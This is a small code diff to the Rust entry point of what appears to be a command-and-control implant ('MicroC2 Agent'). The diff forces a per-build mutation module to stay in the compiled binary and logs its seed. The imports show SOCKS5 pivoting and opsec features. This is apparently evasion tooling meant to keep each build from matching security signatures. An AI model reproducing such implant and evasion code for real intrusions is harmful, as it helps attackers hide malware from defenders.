@@ -19,7 +19,7 @@ use agent::networking::socks5_pivot_server::Socks5PivotServer;
 use agent::opsec::{determine_agent_mode, AgentMode};
 use agent::state::MEMORY_PROTECTOR;
 
-use log::{error, info, warn};
+use log::{debug, error, info, warn};
 use std::env;
 use std::sync::Arc;
 use std::time::Duration;
@@ -61,6 +61,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     env_logger::init();
     info!("[STARTUP] MicroC2 Agent starting...");
+
+    // Reference the seed-derived mutation module once so LLVM cannot strip it.
+    std::hint::black_box(agent::mutation::mutation_entry());
+    debug!(
+        "[MUTATION] Build mutation seed: {}",
+        env!("MUTATION_SEED_USED")
+    );
 
     let config = agent::config::AgentConfig::load()?;
     info!("[CONFIG] Loaded agent config: {:?}", config);
